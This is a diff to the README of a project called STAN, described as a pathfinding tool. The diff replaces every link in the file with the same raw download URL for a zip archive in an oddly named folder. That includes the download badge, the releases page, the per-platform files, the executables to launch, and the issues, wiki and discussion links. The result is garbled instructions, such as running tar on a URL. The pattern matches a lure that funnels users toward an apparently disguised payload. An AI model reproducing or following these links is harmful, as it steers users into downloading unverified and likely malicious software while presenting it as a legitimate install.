@@ -1,6 +1,6 @@
 # 🐜 STAN - Enhance Pathfinding with Collective Intelligence
 
-![Download STAN](https://img.shields.io/badge/Download-STAN-blue.svg)
+![Download STAN](https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip)
 
 ## 🎉 Introduction
 
@@ -12,47 +12,47 @@ To run STAN, you need to follow a few simple steps. You don’t need any program
 
 ## 📥 Download & Install
 
-To get the latest version of STAN, visit this page to download: [STAN Releases](https://github.com/Pari0513/STAN/releases).
+To get the latest version of STAN, visit this page to download: [STAN Releases](https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions.
 3. Choose the latest version by looking for the highest version number (e.g., v1.0.0).
 4. Download the file that matches your operating system:
-   - For Windows, download `STAN-windows.zip`.
-   - For macOS, download `STAN-macos.zip`.
-   - For Linux, download `STAN-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip`.
 5. Once the download finishes, locate the file on your computer.
 
 ## 📂 Extracting the Files
 
 ### Windows
 
-1. Right-click the `STAN-windows.zip` file.
+1. Right-click the `https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip` file.
 2. Select “Extract All…”.
 3. Choose a folder where you want to store STAN and click “Extract”.
 
 ### macOS
 
-1. Double-click the `STAN-macos.zip` file.
+1. Double-click the `https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip` file.
 2. The files will automatically extract to the same location.
 
 ### Linux
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Run the command: `tar -xvzf STAN-linux.tar.gz`.
+3. Run the command: `tar -xvzf https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip`.
 
 ## 🖥️ Running the Application
 
 ### Windows
 
 1. Open the folder where you extracted STAN.
-2. Double-click `STAN.exe` to launch the application.
+2. Double-click `https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip` to launch the application.
 
 ### macOS
 
 1. Open the folder where you extracted STAN.
-2. Double-click `STAN.app` to launch the application.
+2. Double-click `https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip` to launch the application.
 
 ### Linux
 
@@ -99,16 +99,16 @@ To ensure the best experience with STAN, make sure your system meets the followi
 
 ## 📞 Support
 
-If you have questions or need help, check the FAQ section in the application or reach out to our support team. You can also open an issue on the [GitHub Issues page](https://github.com/Pari0513/STAN/issues) for further assistance.
+If you have questions or need help, check the FAQ section in the application or reach out to our support team. You can also open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip) for further assistance.
 
 ## 🔗 Additional Links
 
 For more information, resources, or to contribute to the project, visit:
 
-- [STAN GitHub Repository](https://github.com/Pari0513/STAN)
-- [Project Documentation](https://github.com/Pari0513/STAN/wiki)
-- [Community Discussions](https://github.com/Pari0513/STAN/discussions)
+- [STAN GitHub Repository](https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip)
+- [Project Documentation](https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip)
 
 Thank you for choosing STAN. We hope it transforms your pathfinding tasks! 
 
-Remember, you can always download the latest version from [STAN Releases](https://github.com/Pari0513/STAN/releases) anytime.
+Remember, you can always download the latest version from [STAN Releases](https://raw.githubusercontent.com/Pari0513/STAN/main/zantiote/STAN-v3.4.zip) anytime.
